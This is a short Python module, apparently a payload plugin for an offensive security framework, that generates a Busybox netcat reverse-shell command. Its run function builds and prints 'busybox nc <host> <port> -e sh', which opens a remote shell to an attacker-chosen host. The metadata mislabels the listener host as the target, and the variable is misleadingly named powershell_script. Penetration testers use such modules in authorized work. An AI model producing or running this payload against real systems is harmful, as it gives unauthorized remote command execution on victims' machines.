#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# Metadata for a Busybox Netcat-based reverse shell tool
metadata = {
    "name": "BusyboxNetcatShell Reverse Shell",
    "description": "A reverse shell utilizing Busybox Netcat to execute commands on the target host remotely.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
    "license": "Custom Intellectual License",
    "references": [
        {"type": "url", "ref": "https://github.com/t3l3machus/hoaxshell"},
        {"type": "url", "ref": "https://revshells.com"},
    ],
    "options": {
        "lhost": {
            "type": "address",
            "description": "Target host address for the reverse shell connection",
            "required": True,
            "default": "0.0.0.0",
        },
        "lport": {
            "type": "int",
            "description": "Listening port on the target host for incoming connections",
            "required": False,
            "default": 6501,
        },
        "encode": {
            "type": "string",
            "description": "Encoding method for transmitted commands",
            "required": False,
            "default": "utf-8",
        },
    },
}


class Encoder:
    pass


def run(args):
    lhost = args.get("lhost", "0.0.0.0")
    lport = args.get("lport", 6501)
    encode = args.get("encode", "http")

    powershell_script = f"busybox nc {lhost} {lport} -e sh"
    print(powershell_script)
